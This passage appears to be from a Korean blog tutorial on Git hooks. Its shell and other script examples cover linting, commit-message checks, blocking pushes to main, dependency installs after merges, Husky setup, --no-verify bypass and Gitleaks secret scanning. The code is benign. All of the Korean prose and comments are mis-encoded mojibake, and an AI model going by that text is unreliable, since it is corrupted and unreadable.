ì•Œë¦¼)</li></ul><h2 id="Hook-íŒŒì¼-ìœ„ì¹˜"><a href="#Hook-íŒŒì¼-ìœ„ì¹˜" class="headerlink" title="Hook íŒŒì¼ ìœ„ì¹˜"></a>Hook íŒŒì¼ ìœ„ì¹˜</h2><p>Git Hook ìŠ¤í¬ë¦½íŠ¸ëŠ” <code>.git/hooks/</code> ë””ë ‰í† ë¦¬ì— ì €ì¥ë©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hook ë””ë ‰í† ë¦¬ í™•ì¸</span></span><br><span class="line"><span class="built_in">ls</span> -la .git/hooks/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìƒ˜í”Œ íŒŒì¼ë“¤</span></span><br><span class="line">.git/hooks/pre-commit.sample</span><br><span class="line">.git/hooks/commit-msg.sample</span><br><span class="line">.git/hooks/pre-push.sample</span><br></pre></td></tr></table></figure><p>ìƒ˜í”Œ íŒŒì¼ì˜ <code>.sample</code> í™•ì¥ìë¥¼ ì œê±°í•˜ë©´ í™œì„±í™”ë©ë‹ˆë‹¤.</p><h2 id="Git-Hook-ì‘ì„±-ì˜ˆì‹œ"><a href="#Git-Hook-ì‘ì„±-ì˜ˆì‹œ" class="headerlink" title="Git Hook ì‘ì„± ì˜ˆì‹œ"></a>Git Hook ì‘ì„± ì˜ˆì‹œ</h2><h3 id="1-Pre-commit-Hook-ì½”ë“œ-í’ˆì§ˆ-ê²€ì‚¬"><a href="#1-Pre-commit-Hook-ì½”ë“œ-í’ˆì§ˆ-ê²€ì‚¬" class="headerlink" title="1. Pre-commit Hook - ì½”ë“œ í’ˆì§ˆ ê²€ì‚¬"></a>1. Pre-commit Hook - ì½”ë“œ í’ˆì§ˆ ê²€ì‚¬</h3><p>ì»¤ë°‹ ì „ ìë™ìœ¼ë¡œ ë¦°íŠ¸ì™€ í…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/pre-commit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running pre-commit checks...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript/TypeScript í”„ë¡œì íŠ¸</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;package.json&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Running ESLint...&quot;</span></span><br><span class="line">    npm run lint</span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;âŒ ESLint check failed. Please fix the errors and try again.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Running tests...&quot;</span></span><br><span class="line">    npm <span class="built_in">test</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;âŒ Tests failed. Please fix the tests and try again.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python í”„ë¡œì íŠ¸</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;requirements.txt&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Running flake8...&quot;</span></span><br><span class="line">    flake8 .</span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;âŒ Flake8 check failed.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Trailing whitespace ì œê±°</span></span><br><span class="line">git diff --check</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Detected trailing whitespace. Please remove it.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… All pre-commit checks passed!&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-Commit-msg-Hook-ì»¤ë°‹-ë©”ì‹œì§€-ê²€ì¦"><a href="#2-Commit-msg-Hook-ì»¤ë°‹-ë©”ì‹œì§€-ê²€ì¦" class="headerlink" title="2. Commit-msg Hook - ì»¤ë°‹ ë©”ì‹œì§€ ê²€ì¦"></a>2. Commit-msg Hook - ì»¤ë°‹ ë©”ì‹œì§€ ê²€ì¦</h3><p>Conventional Commits í˜•ì‹ì„ ê°•ì œí•©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/commit-msg</span></span><br><span class="line"></span><br><span class="line">commit_msg_file=<span class="variable">$1</span></span><br><span class="line">commit_msg=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$commit_msg_file</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Conventional Commits íŒ¨í„´</span></span><br><span class="line"><span class="comment"># feat: ìƒˆë¡œìš´ ê¸°ëŠ¥</span></span><br><span class="line"><span class="comment"># fix: ë²„ê·¸ ìˆ˜ì •</span></span><br><span class="line"><span class="comment"># docs: ë¬¸ì„œ ë³€ê²½</span></span><br><span class="line"><span class="comment"># style: ì½”ë“œ í¬ë§·íŒ…</span></span><br><span class="line"><span class="comment"># refactor: ë¦¬íŒ©í† ë§</span></span><br><span class="line"><span class="comment"># test: í…ŒìŠ¤íŠ¸ ì¶”ê°€</span></span><br><span class="line"><span class="comment"># chore: ë¹Œë“œ ì—…ë¬´, íŒ¨í‚¤ì§€ ë§¤ë‹ˆì € ì„¤ì •</span></span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&quot;^(feat|fix|docs|style|refactor|test|chore|perf|ci|build|revert)(\(.+\))?: .&#123;1,50&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$commit_msg</span>&quot;</span> | grep -qE <span class="string">&quot;<span class="variable">$pattern</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Invalid commit message format!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Commit message must follow Conventional Commits format:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  &lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Examples:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  feat: add user authentication&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  fix(api): resolve CORS issue&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  docs: update README&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Types: feat, fix, docs, style, refactor, test, chore, perf, ci, build, revert&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… Commit message format is valid&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-Pre-push-Hook-í‘¸ì‹œ-ì „-ê²€ì¦"><a href="#3-Pre-push-Hook-í‘¸ì‹œ-ì „-ê²€ì¦" class="headerlink" title="3. Pre-push Hook - í‘¸ì‹œ ì „ ê²€ì¦"></a>3. Pre-push Hook - í‘¸ì‹œ ì „ ê²€ì¦</h3><p>ì›ê²© ì €ì¥ì†Œì— í‘¸ì‹œí•˜ê¸° ì „ ëª¨ë“  í…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/pre-push</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running pre-push checks...&quot;</span></span><br><span class="line"></span><br><span class="line">protected_branch=<span class="string">&#x27;main&#x27;</span></span><br><span class="line">current_branch=$(git symbolic-ref HEAD | sed -e <span class="string">&#x27;s,.*/\(.*\),\1,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main ë¸Œëœì¹˜ ì§ì ‘ í‘¸ì‹œ ë°©ì§€</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$current_branch</span>&quot;</span> = <span class="string">&quot;<span class="variable">$protected_branch</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Direct push to main branch is not allowed!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please create a feature branch and open a pull request.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì „ì²´ í…ŒìŠ¤íŠ¸ ì‹¤í–‰</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running full test suite...&quot;</span></span><br><span class="line">npm run <span class="built_in">test</span>:ci</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Tests failed. Push aborted.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¹Œë“œ í…ŒìŠ¤íŠ¸</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Testing build...&quot;</span></span><br><span class="line">npm run build</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Build failed. Push aborted.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… All pre-push checks passed!&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4-Post-merge-Hook-ë¨¸ì§€-í›„-ì˜ì¡´ì„±-ì—…ë°ì´íŠ¸"><a href="#4-Post-merge-Hook-ë¨¸ì§€-í›„-ì˜ì¡´ì„±-ì—…ë°ì´íŠ¸" class="headerlink" title="4. Post-merge Hook - ë¨¸ì§€ í›„ ì˜ì¡´ì„± ì—…ë°ì´íŠ¸"></a>4. Post-merge Hook - ë¨¸ì§€ í›„ ì˜ì¡´ì„± ì—…ë°ì´íŠ¸</h3><p>ë¸Œëœì¹˜ ë¨¸ì§€ í›„ ìë™ìœ¼ë¡œ ì˜ì¡´ì„±ì„ ì„¤ì¹˜í•©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/post-merge</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Checking for dependency changes...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># package.json ë˜ëŠ” package-lock.json ë³€ê²½ í™•ì¸</span></span><br><span class="line">changed_files=<span class="string">&quot;<span class="subst">$(git diff-tree -r --name-only --no-commit-id ORIG_HEAD HEAD)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_run</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$changed_files</span>&quot;</span> | grep --quiet <span class="string">&quot;<span class="variable">$1</span>&quot;</span> &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Node.js ì˜ì¡´ì„± ì—…ë°ì´íŠ¸</span></span><br><span class="line">check_run package.json <span class="string">&quot;echo &#x27;ğŸ“¦ package.json changed. Running npm install...&#x27; &amp;&amp; npm install&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python ì˜ì¡´ì„± ì—…ë°ì´íŠ¸</span></span><br><span class="line">check_run requirements.txt <span class="string">&quot;echo &#x27;ğŸ“¦ requirements.txt changed. Running pip install...&#x27; &amp;&amp; pip install -r requirements.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Go ëª¨ë“ˆ ì—…ë°ì´íŠ¸</span></span><br><span class="line">check_run go.mod <span class="string">&quot;echo &#x27;ğŸ“¦ go.mod changed. Running go mod download...&#x27; &amp;&amp; go mod download&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… Post-merge checks completed!&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-Prepare-commit-msg-Hook-ì´ìŠˆ-ë²ˆí˜¸-ìë™-ì¶”ê°€"><a href="#5-Prepare-commit-msg-Hook-ì´ìŠˆ-ë²ˆí˜¸-ìë™-ì¶”ê°€" class="headerlink" title="5. Prepare-commit-msg Hook - ì´ìŠˆ ë²ˆí˜¸ ìë™ ì¶”ê°€"></a>5. Prepare-commit-msg Hook - ì´ìŠˆ ë²ˆí˜¸ ìë™ ì¶”ê°€</h3><p>ë¸Œëœì¹˜ ì´ë¦„ì—ì„œ ì´ìŠˆ ë²ˆí˜¸ë¥¼ ì¶”ì¶œí•˜ì—¬ ì»¤ë°‹ ë©”ì‹œì§€ì— ìë™ìœ¼ë¡œ ì¶”ê°€í•©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/prepare-commit-msg</span></span><br><span class="line"></span><br><span class="line">commit_msg_file=<span class="variable">$1</span></span><br><span class="line">commit_source=<span class="variable">$2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¨¸ì§€ ì»¤ë°‹ì´ë©´ ìŠ¤í‚µ</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$commit_source</span>&quot;</span> = <span class="string">&quot;merge&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¸Œëœì¹˜ ì´ë¦„ì—ì„œ ì´ìŠˆ ë²ˆí˜¸ ì¶”ì¶œ (ì˜ˆ: feature/ISSUE-123-description)</span></span><br><span class="line">branch_name=$(git symbolic-ref --short HEAD)</span><br><span class="line">issue_number=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$branch_name</span>&quot;</span> | grep -o -E <span class="string">&#x27;[A-Z]+-[0-9]+&#x27;</span> | <span class="built_in">head</span> -1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$issue_number</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># ê¸°ì¡´ ë©”ì‹œì§€ ì½ê¸°</span></span><br><span class="line">    commit_msg=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$commit_msg_file</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì´ë¯¸ ì´ìŠˆ ë²ˆí˜¸ê°€ ìˆìœ¼ë©´ ìŠ¤í‚µ</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$commit_msg</span>&quot;</span> | grep -q <span class="string">&quot;<span class="variable">$issue_number</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># ì´ìŠˆ ë²ˆí˜¸ ì¶”ê°€</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$commit_msg</span>&quot;</span> | sed <span class="string">&quot;1s/^/[<span class="variable">$issue_number</span>] /&quot;</span> &gt; <span class="string">&quot;<span class="variable">$commit_msg_file</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;âœ… Added issue number: <span class="variable">$issue_number</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h2 id="Hook-íŒŒì¼-ì‹¤í–‰-ê¶Œí•œ-ë¶€ì—¬"><a href="#Hook-íŒŒì¼-ì‹¤í–‰-ê¶Œí•œ-ë¶€ì—¬" class="headerlink" title="Hook íŒŒì¼ ì‹¤í–‰ ê¶Œí•œ ë¶€ì—¬"></a>Hook íŒŒì¼ ì‹¤í–‰ ê¶Œí•œ ë¶€ì—¬</h2><p>Hook ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•œ í›„ ì‹¤í–‰ ê¶Œí•œì„ ë¶€ì—¬í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x .git/hooks/pre-commit</span><br><span class="line"><span class="built_in">chmod</span> +x .git/hooks/commit-msg</span><br><span class="line"><span class="built_in">chmod</span> +x .git/hooks/pre-push</span><br><span class="line"><span class="built_in">chmod</span> +x .git/hooks/post-merge</span><br></pre></td></tr></table></figure><h2 id="Hook-ê³µìœ í•˜ê¸°"><a href="#Hook-ê³µìœ í•˜ê¸°" class="headerlink" title="Hook ê³µìœ í•˜ê¸°"></a>Hook ê³µìœ í•˜ê¸°</h2><p><code>.git/hooks/</code> ë””ë ‰í† ë¦¬ëŠ” Gitìœ¼ë¡œ ì¶”ì ë˜ì§€ ì•Šì•„ íŒ€ì›ê³¼ ê³µìœ í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë‹¤ìŒ ë°©ë²•ìœ¼ë¡œ Hookì„ ê³µìœ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="ë°©ë²•-1-ìŠ¤í¬ë¦½íŠ¸ë¥¼-ì €ì¥ì†Œì—-í¬í•¨"><a href="#ë°©ë²•-1-ìŠ¤í¬ë¦½íŠ¸ë¥¼-ì €ì¥ì†Œì—-í¬í•¨" class="headerlink" title="ë°©ë²• 1: ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì €ì¥ì†Œì— í¬í•¨"></a>ë°©ë²• 1: ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì €ì¥ì†Œì— í¬í•¨</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># í”„ë¡œì íŠ¸ ë£¨íŠ¸ì— hooks ë””ë ‰í† ë¦¬ ìƒì„±</span></span><br><span class="line"><span class="built_in">mkdir</span> -p .githooks</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hook ìŠ¤í¬ë¦½íŠ¸ë¥¼ .githooksì— ì‘ì„±</span></span><br><span class="line"><span class="comment"># .githooks/pre-commit</span></span><br><span class="line"><span class="comment"># .githooks/commit-msg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Git ì„¤ì • ë³€ê²½</span></span><br><span class="line">git config core.hooksPath .githooks</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŒ€ì›ë„ ë™ì¼í•˜ê²Œ ì„¤ì •</span></span><br></pre></td></tr></table></figure><h3 id="ë°©ë²•-2-ì„¤ì¹˜-ìŠ¤í¬ë¦½íŠ¸-ì œê³µ"><a href="#ë°©ë²•-2-ì„¤ì¹˜-ìŠ¤í¬ë¦½íŠ¸-ì œê³µ" class="headerlink" title="ë°©ë²• 2: ì„¤ì¹˜ ìŠ¤í¬ë¦½íŠ¸ ì œê³µ"></a>ë°©ë²• 2: ì„¤ì¹˜ ìŠ¤í¬ë¦½íŠ¸ ì œê³µ</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># scripts/install-hooks.sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Installing Git hooks...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hooks ë³µì‚¬</span></span><br><span class="line"><span class="built_in">cp</span> scripts/hooks/* .git/hooks/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‹¤í–‰ ê¶Œí•œ ë¶€ì—¬</span></span><br><span class="line"><span class="built_in">chmod</span> +x .git/hooks/*</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… Git hooks installed successfully!&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prepare&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sh scripts/install-hooks.sh&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ë°©ë²•-3-Husky-ì‚¬ìš©-Node-js-í”„ë¡œì íŠ¸"><a href="#ë°©ë²•-3-Husky-ì‚¬ìš©-Node-js-í”„ë¡œì íŠ¸" class="headerlink" title="ë°©ë²• 3: Husky ì‚¬ìš© (Node.js í”„ë¡œì íŠ¸)"></a>ë°©ë²• 3: Husky ì‚¬ìš© (Node.js í”„ë¡œì íŠ¸)</h3><p>HuskyëŠ” Git Hookì„ ì‰½ê²Œ ê´€ë¦¬í•  ìˆ˜ ìˆëŠ” ë„êµ¬ì…ë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Husky ì„¤ì¹˜</span></span><br><span class="line">npm install --save-dev husky</span><br><span class="line"></span><br><span class="line"><span class="comment"># Husky ì´ˆê¸°í™”</span></span><br><span class="line">npx husky init</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hook ì¶”ê°€</span></span><br><span class="line">npx husky add .husky/pre-commit <span class="string">&quot;npm run lint&quot;</span></span><br><span class="line">npx husky add .husky/commit-msg <span class="string">&#x27;npx --no -- commitlint --edit &quot;$1&quot;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prepare&quot;</span><span class="punctuation">:</span> <span class="string">&quot;husky install&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ë‹¤ì–‘í•œ-ì–¸ì–´ë¡œ-Hook-ì‘ì„±"><a href="#ë‹¤ì–‘í•œ-ì–¸ì–´ë¡œ-Hook-ì‘ì„±" class="headerlink" title="ë‹¤ì–‘í•œ ì–¸ì–´ë¡œ Hook ì‘ì„±"></a>ë‹¤ì–‘í•œ ì–¸ì–´ë¡œ Hook ì‘ì„±</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running bash hook&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Running Python hook&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env node</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Running Node.js hook&#x27;</span>);</span><br><span class="line">process.<span class="title function_">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env ruby</span></span><br><span class="line"></span><br><span class="line">puts <span class="string">&quot;Running Ruby hook&quot;</span></span><br><span class="line">exit <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="Hook-ìš°íšŒí•˜ê¸°"><a href="#Hook-ìš°íšŒí•˜ê¸°" class="headerlink" title="Hook ìš°íšŒí•˜ê¸°"></a>Hook ìš°íšŒí•˜ê¸°</h2><p>í…ŒìŠ¤íŠ¸ë‚˜ ê¸´ê¸‰í•œ ìƒí™©ì—ì„œ Hookì„ ì¼ì‹œì ìœ¼ë¡œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --no-verify ë˜ëŠ” -n ì˜µì…˜ ì‚¬ìš©</span></span><br><span class="line">git commit --no-verify -m <span class="string">&quot;urgent fix&quot;</span></span><br><span class="line">git commit -n -m <span class="string">&quot;urgent fix&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># í‘¸ì‹œ ì‹œ</span></span><br><span class="line">git push --no-verify</span><br></pre></td></tr></table></figure><p><strong>ì£¼ì˜</strong>: í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œëŠ” Hookì„ ìš°íšŒí•˜ì§€ ì•ŠëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.</p><h2 id="ì‹¤ì „-í™œìš©-ì˜ˆì‹œ"><a href="#ì‹¤ì „-í™œìš©-ì˜ˆì‹œ" class="headerlink" title="ì‹¤ì „ í™œìš© ì˜ˆì‹œ"></a>ì‹¤ì „ í™œìš© ì˜ˆì‹œ</h2><h3 id="ë³´ì•ˆ-ê²€ì‚¬-Gitleaks-í†µí•©"><a href="#ë³´ì•ˆ-ê²€ì‚¬-Gitleaks-í†µí•©" class="headerlink" title="ë³´ì•ˆ ê²€ì‚¬ - Gitleaks í†µí•©"></a>ë³´ì•ˆ ê²€ì‚¬ - Gitleaks í†µí•©</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/pre-commit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running Gitleaks security scan...&quot;</span></span><br><span class="line"></span><br><span class="line">gitleaks protect --verbose --redact --staged</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;âŒ Gitleaks detected sensitive information.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Please remove secrets before committing.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;âœ… No secrets detected&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ì½”ë“œ-í¬ë§·íŒ…-Prettier-ìë™-ì‹¤í–‰"><a href="#ì½”ë“œ-í¬ë§·íŒ…-Prettier-ìë™-ì‹¤í–‰" class="headerlink" title="ì½”ë“œ í¬ë§·íŒ… - Prettier ìë™ ì‹¤í–‰"></a>ì½”ë“œ í¬ë§·íŒ… - Prettier ìë™ ì‹¤í–‰</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># .git/hooks/pre-commit</span></span><br><span class="line"></span><br><span class="line">files=$(git diff --cached --name-only --diff-filter=ACMR | grep -E <span class="string">&#x27;\.(js|jsx|ts|tsx|json|css|md)$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$files</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Formatting files with Prettier...&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span 